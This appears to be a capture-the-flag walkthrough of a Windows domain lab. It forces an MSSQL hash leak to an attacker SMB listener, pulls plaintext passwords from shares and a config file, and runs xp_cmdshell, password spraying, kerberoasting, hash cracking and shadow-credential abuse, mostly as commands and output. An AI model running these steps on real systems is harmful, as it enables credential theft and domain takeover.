As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su

## HOST RECON

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```


#### users

```
└─$ netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --rid-brute | grep SidTypeUser 
SMB                      10.10.11.51     445    DC01             500: SEQUEL\Administrator (SidTypeUser)
SMB                      10.10.11.51     445    DC01             501: SEQUEL\Guest (SidTypeUser)
SMB                      10.10.11.51     445    DC01             502: SEQUEL\krbtgt (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1103: SEQUEL\michael (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1114: SEQUEL\ryan (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1116: SEQUEL\oscar (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1601: SEQUEL\rose (SidTypeUser)
SMB                      10.10.11.51     445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)
```

#### groups

```
└─$ netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --rid-brute | grep SidTypeGroup 
SMB                      10.10.11.51     445    DC01             498: SEQUEL\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             512: SEQUEL\Domain Admins (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             513: SEQUEL\Domain Users (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             514: SEQUEL\Domain Guests (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             515: SEQUEL\Domain Computers (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             516: SEQUEL\Domain Controllers (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             518: SEQUEL\Schema Admins (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             519: SEQUEL\Enterprise Admins (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             520: SEQUEL\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             521: SEQUEL\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             522: SEQUEL\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             525: SEQUEL\Protected Users (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             526: SEQUEL\Key Admins (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             527: SEQUEL\Enterprise Key Admins (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             1102: SEQUEL\DnsUpdateProxy (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             1602: SEQUEL\Management Department (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             1603: SEQUEL\Sales Department (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             1604: SEQUEL\Accounting Department (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             1605: SEQUEL\Reception Department (SidTypeGroup)
SMB                      10.10.11.51     445    DC01             1606: SEQUEL\Human Resources Department (SidTypeGroup)
```

## BloodHound data

```
rose ---> no outbound info

michael ---> no outbound info

ryan ---> MemberOf ---> Management Departament, Remote Management Users
	|___ OutBound ---> Has ---> GenericAll, Owns, WriteOwner ---> over CA_SVC

ca_svc ---> MemberOf ---> Cert Publishers, Denied Rodc Password Replicaition Group
	  |__ no outbound info

oscar ---> MemberOf ---> Accounting Departament
	|__ no outbound info
        |__ inbound info only admins


sql_svc ---> MemeberOf ---> SQLServer2005SQLBrowserUser, SQLRUserGroupSQLEXPRESS
	   |__ no outbound info
	   |__ inbound info only admins
```

## Auth on MSSQL with rose creds

- https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/

#### relay attack

- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#steal-netntlm-hash--relay-attack

```
SQL (SEQUEL\rose  guest@msdb)> exec xp_dirtree '\\10.10.14.15\test'
subdirectory   depth   



[+] Listening for events...                                                                                                                                                                  

[SMB] NTLMv2-SSP Client   : 10.10.11.51
[SMB] NTLMv2-SSP Username : SEQUEL\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::SEQUEL:f86d66b56647cac1:84649C4284E15A49DEFBDF68AF26513C:010100000000000080A888D51E69DB01BEDA72833DECFEBE0000000002000800530046004E005A0001001E00570049004E002D00570044004F0054004B003500470041004B005A004C0004003400570049004E002D00570044004F0054004B003500470041004B005A004C002E00530046004E005A002E004C004F00430041004C0003001400530046004E005A002E004C004F00430041004C0005001400530046004E005A002E004C004F00430041004C000700080080A888D51E69DB0106000400020000000800300030000000000000000000000000300000C95E558D4BADA9773167979D8331BA83DD8B19E6566D613F88F566F6933F7BB50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310035000000000000000000   
```

#### Spidering SMB Shares with rose creds

```
└─$ netexec smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' -M spider_plus -o DOWNLOAD_FLAG=True
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.10.11.51     445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.51     445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.51     445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ 
SPIDER_PLUS 10.10.11.51     445    DC01             [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.
SPIDER_PLUS 10.10.11.51     445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.11.51.json".
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Shares:           6 (Accounting Department, ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Readable Shares:  4 (Accounting Department, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Total folders found:  21
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Total files found:    8
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size average:    3.75 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size min:        23 B
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size max:        9.98 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File unique exts:     5 (.ini, .pol, .inf, .xlsx, .cmtx)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Downloads successful: 8
SPIDER_PLUS 10.10.11.51     445    DC01             [+] All files processed successfully.
```

#### Analyzing rose smb files

```
└─$ tree Accounting\ Department 
Accounting Department
├── accounting_2024.xlsx
└── accounts.xlsx

1 directory, 2 files
```

- https://unix.stackexchange.com/questions/783419/opening-xlsx-file-in-linux-terminal

```
lastModifiedBy>Ruy Alonso Fernández</cp:lastModifiedBy><dcterms:created xsi:type="dcterms:W3CDTF">2024-06-09T09:44:43Z</dcterms:created><dcterms:modified xsi:type="dcterms:W3CDTF">2024-06-09T09:48:57Z</dcterms:modified></cp:coreProperties>

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

angela - 0fwz7Q4mSpurIt99
oscar - 86LxLBMgEWaKUnBG
kevin - Md9Wlq1E5bZnVDVo
sa - MSSQLP@ssw0rd!

```
└─$ netexec smb 10.10.11.51 -u users.txt -p '86LxLBMgEWaKUnBG'                                       
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
```


## Auth MSSQL server with sql_svc creds

```
└─$ impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'                  


SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.



SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL    
```

```
SQL (sa  dbo@master)> exec xp_cmdshell 'type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI'
output                                              
-------------------------------------------------   
[OPTIONS]                                           

ACTION="Install"                                    

QUIET="True"                                        

FEATURES=SQL                                        

INSTANCENAME="SQLEXPRESS"                           

INSTANCEID="SQLEXPRESS"                             

RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"   

AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"        

AGTSVCSTARTUPTYPE="Manual"                          

COMMFABRICPORT="0"                                  

COMMFABRICNETWORKLEVEL=""0"                         

COMMFABRICENCRYPTION="0"                            

MATRIXCMBRICKCOMMPORT="0"                           

SQLSVCSTARTUPTYPE="Automatic"                       

FILESTREAMLEVEL="0"                                 

ENABLERANU="False"                                  

SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"         

SQLSVCACCOUNT="SEQUEL\sql_svc"                      

SQLSVCPASSWORD="WqSZAF6CysDQbGb3"                   

SQLSYSADMINACCOUNTS="SEQUEL\Administrator"          

SECURITYMODE="SQL"                                  

SAPWD="MSSQLP@ssw0rd!"                              

ADDCURRENTUSERASSQLADMIN="False"                    

TCPENABLED="1"                                      

NPENABLED="1"                                       

BROWSERSVCSTARTUPTYPE="Automatic"                   

IAcceptSQLServerLicenseTerms=True                   

NULL          
```

```
└─$ nxc smb 10.10.11.51 -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\administrator:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 
```


## Login as Ryan

```
└─$ evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ============================================
sequel\ryan S-1-5-21-548670397-972687484-3496335370-1114


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
SEQUEL\Management Department                Group            S-1-5-21-548670397-972687484-3496335370-1602 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

```
ObjectDN                : CN=Certification Authority,CN=Users,DC=sequel,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-548670397-972687484-3496335370-1114
IdentityReferenceName   : ryan
IdentityReferenceDomain : sequel.htb
IdentityReferenceDN     : CN=Ryan Howard,CN=Users,DC=sequel,DC=htb
IdentityReferenceClass  : user
```


## Abuse ryan rights over ca_svc

```
└─$ ./targetedKerberoast.py -v --dc-ip dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (sql_svc)
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$2a2bb79e5905ebdcab49bc1cc11a7e23$d765c5263b28fb4971848a8d94f8669f2b177c9965d3f425123d43676a056d9018b9984a0712c038a51e6d4a72ff682fd993aadf5ddd93375f61b87fd5f401b5a6d6309b714bac7b7b4d56931f43f5b5f81c5b14926735e47a9f77fa95e0e79b0e6c2c7a16c5c47e9cc86a5c23a95bf797cfe7ac4642f9975ccf7ce283f2f48fe295895bc4944a95cb142c5b208523ffe9a714701c647d1920080e3dea25b9b63b1fe5e6bf89910d8b1ff7f9a011aef538d767468cc261783a328af1877d976fce6e91427c4f34ec982a5173e644955509b4fb9e50e9fc1d63fccbfa1a77fe73c4012f3e340df7b94ced0f20e4c82bcf1e1a329b92505e1cfb7b39d5e663fd50d1d5d3a652c82e438680ba6624d30852a1e1c9404498e02ca92aa754f5afc87439c3fbde9626b877601d3ee05ef9f49a6e53ece196da92e0be6d1178e0a6ee19a2128d5a73b55218869489324de60c067df93ff3faae426c8d593f1cbcbd2e13218e7606fbd308234751501298b09fd7cd74236eb3e06f109a5d9c20bd4008a30f1acc77fadc8c31a8ac3c18c7e85f6362e218154db52a3af02b595885eb244e672a6c2d67f53d9a0005be7ebfa1435e05d486259e738fb653061176305a33abeeb6d4b5867b953cb0126f2c68a569f62251fe720f6ba6e5967735b4a7411add8a47a5e7689cb270a237044866244c35e19799dd5b3db2760e9dcfe9f66f8f38be11da213c7fa820034c1939ec1c8db3655a95616dcfbd43e9d5d1167f93ae0eec837495fd02309de060a1e4722f6e1eb972fe6a925dc6a1787b819dba0568d39196b051036420e13f559152d5dc38a0b69266c87284ceb3a76585f22746c6ed6b452577a062d4af297ebdfece12eefad9f827851b9966cda31ba415a85ebe35d7e49bbd440dccc6d384ff8c9631d4ce749716329b1b2a6e8c2b99bcbd3a0c098458844eeba089b83462e78e3fbec39fd7cc2bbb797c7ebddc425c97f91e45d64617bbf95c515d2557c954988e401e11df297e64d6860dd74ee4008fa7c8a541f91502229dd7a22a3828318d3d731969d716c4b9a2b5f85a78c7c7a97391f1f70553f1e5e5dbe8e58a2889dce2d2e5288f233d4d2fbce599e917401e9b1a0d20741132d3acf48e9f6bb6a7ad9f8a06a4d317598d4c2b132392e0242dd1a2b795d949e0843d41cd135c4e05c93b9df558b976b4ed10dea17be0bb368d3d9af67c1a57572b03030d005e16ddac32f54330c29588b425f0a3791a7bea24a708fdf17bd820f4ecdbf08db61bda2085eedbe26485ba7fd44fbc513045322528eb40c58052a254bfbdef504b38cf614d4cafc57b4dff68c769ad83a8a84e9dbe21074ee5278128bea3a9937131dd25dc29189855546ea22a860524b8cdb982e35938832569ccadb3e074323942d44819615a06ceca40397ea766e6bb994eb034630a
[+] Printing hash for (ca_svc)
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$dfa50c32aae622c07df03bc684461dad$40e38538fde99f21c5757c99bc4216a742eeadbca2461ffbbc6d2ef959212996870f5b6145b87f347c574798629f12a5633e5360cc629c92c52632d888cb547a6b4dce95821148f018e106499a605031dc4e64c281b6ac97c70a27f28f7034667d90ff3fc70ccaf72e6ca710ba7030b96fa18a3ef71339a8b6819512027cfd047629323e3057e6b97f8668ca1f0152b21e15560dc419031bc3e435d45a26702029c8cb33cea70b32a62b17af11ff8c0906ec16d9400520c9ec7598620d87e9fb5f9ab001224529c026a58df695529973db9ba20d99b4e35f8fc628480e8ef6a38570af2ec071e837e973aad1959c5a5dc222ec53b382206da4a1f5c3fc52ba8a32c8c41a01b33f3ffab3865aa295efa70856b0833539f810bb36d7b38fb249e4f7004567e2811cc6c51f6bc03a0241ab19b86f5de36bed836b9c380b0b30b2d3e10446f855d5b81bd09222c4e8bb957b46a8001bf69246302b898f03849d7a47156c134402e4db1c549e1773869b6a250eb8ca055c4e1e5e422d0e279028a94daf4e6c931de862756a22df3f6ea0a9fae3126c042bbdb62b13232e2b93687267f51ed18eee42367c3f245abf0070fb398963ebbc3e80e9286b110430bb345bd2bc3d1e97bb0180aa064693acb64fc2a72383b9d640563840235c8b74b60966f37c44fe985dec2f933537bedd5d8dbd18886398e3053f1cc40ff575dd5c35d2ce10bdb3eb1434c83fbca94493595b73f1c03e25285c678747d8464707463ba29f85c6b1495aa303de24bf966e52c5fcf28a975cd3cb0e70d8338ed24527e8262aba54fae8a0947cdcd7876d85900f5af73ec01838f18e8b0b9eee07370c4959fa36016c66d37b38498a0d3021e65ad16f60a1b336dc361889527ddbb12c01458b1072e3acb5044884d9615722980c2055b49dbe0c372aa0c17d0b5d91d9e55ed7cc1dcaf6998853f7ef08b01452efbf8ba0680297cbb3cd2c3b5e4766c03188c8396d9f8f98cc2b66dbf8adfceb7092d68ae8361e76f13b5052e03ebfa700b298fc57283e4cb4e51b97240cde25d16b7f186cb0941742f29dfe4bbaac9a99e0c4467851e7592f513606d2710140cc3ad059f58e3658b4f43a91ff2f24b60bcb73a521138badf54be856d39d7abc4661650c1907658f562cda72bdc5f27952222bcd01236f8dc52871bf30351070aacf53f5b801887e7cef880ce833e6796004588a2c09e1713ffa93e26aa92cd8bdb3c07c6ad567190f7115291357eb4bb2ab102ad94939d181f1370f4da2d0b44a08164e6b13e0fcdf801c4c3f420480bbb05be6afab9477203cdd9d0eac181871c0b9626a75dcd4f0e707a02505f7cdaaccc9a42dbc0f9c96fa0c03f238877af81c2dddbb8642828f5522746e9d7beba8de0d5d794887e6e7a96b27ed4be86cdf46bbf2de77aa97e9e0355d5ebccc0abf95
```

```
└─$ john ca_svc_hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass123          (?)     
1g 0:00:00:00 DONE (2025-01-18 14:06) 16.66g/s 102400p/s 102400c/s 102400C/s terminator..horoscope
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```
└─$ bloodyAD --dc-ip 10.10.11.51 --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set password ca_svc 'Password@123'

Password can't be changed before -2 days, 23:57:55.874208 because of the minimum password age policy.
```

## Shadow Credentials works

```
*Evil-WinRM* PS C:\Users\ryan\Documents> .\Whisker.exe add /target:"ca_svc" /domain:"sequel.htb" /dc:"dc01.sequel.htb" /path:"cert.pfx" /password:"WqSZAF6CysDQbGb3"
[*] Searching for the target account
[*] Target user found: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 328a9cf0-02ee-4afc-a377-e2cfe0763bf4
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saving the associated certificate to file...
[*] The associated certificate was saved to cert.pfx
[*] You can now run Rubeus with the following syntax:
```

```
*Evil-WinRM* PS C:\Users\ryan\Documents> .\Rubeus.exe asktgt /user:ca_svc /certificate:cert.pfx /password:"WqSZAF6CysDQbGb3" /domain:sequel.htb /dc:dc01.sequel.htb /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ca_svc
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\ca_svc'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  ca_svc (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  1/18/2025 12:13:04 PM
  EndTime                  :  1/18/2025 10:13:04 PM
  RenewTill                :  1/25/2025 12:13:04 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  LQfusykqaeGcG3HasSPr8A==
  ASREP (key)              :  7A5C9FF7CBA76AB6596054FB9A47D255

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3B181B914E7A9D5508EA1E20BC2B7FCE
```

3b181b914e7a9d5508ea1e20bc2b7fce

```
└─$ nxc ldap 10.10.11.51 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce --query "(sAMAccountName=ca_svc)" ""       
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce 
LDAP        10.10.11.51     389    DC01             [+] Response for object: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
LDAP        10.10.11.51     389    DC01             objectClass:         top person organizationalPerson user
LDAP        10.10.11.51     389    DC01             cn:                  Certification Authority
LDAP        10.10.11.51     389    DC01             sn:                  Authority
LDAP        10.10.11.51     389    DC01             givenName:           Certification
